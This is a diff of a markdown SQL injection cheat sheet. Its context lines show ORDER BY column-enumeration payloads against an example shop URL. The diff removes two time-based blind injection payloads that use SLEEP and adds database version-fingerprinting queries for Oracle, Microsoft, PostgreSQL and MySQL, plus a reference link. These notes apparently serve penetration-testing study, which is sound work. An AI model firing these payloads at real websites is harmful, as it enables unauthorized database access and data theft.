@@ -9,10 +9,12 @@ After determining if the website is vulnerable to SQL Injection, try to find the
 --> www.onlineshopping.com/products.php?pid=8 order by 1 -- //  
 --> www.onlineshopping.com/products.php?usr=b' order by 3 -- // (If the parameter is a string then you need to add ' after it.)
 
-To preserve the space after -- add any character after that so that space doesn't get ignored in the HTTP request. Might also use #, /* */ for comments depending on the SQL database provider.
+To preserve the space after -- add any character after that so that space doesn't get ignored in the HTTP request. Might also use #, /* */ for comments depending on the SQL database provider
 
-### Blind Sql
+Oracle 	SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft 	SELECT @@version
+PostgreSQL 	SELECT version()
+MySQL 	SELECT @@version 
 
-##Time-based
-test%25'+AND+(SELECT+6408+FROM+(SELECT(SLEEP(5)))qOqt)+AND+'Eouw%25'%3d'Eouw
-'%20and%20(select*from(select(sleep(10)))a)--
+For more: https://portswigger.net/web-security/sql-injection/cheat-sheet
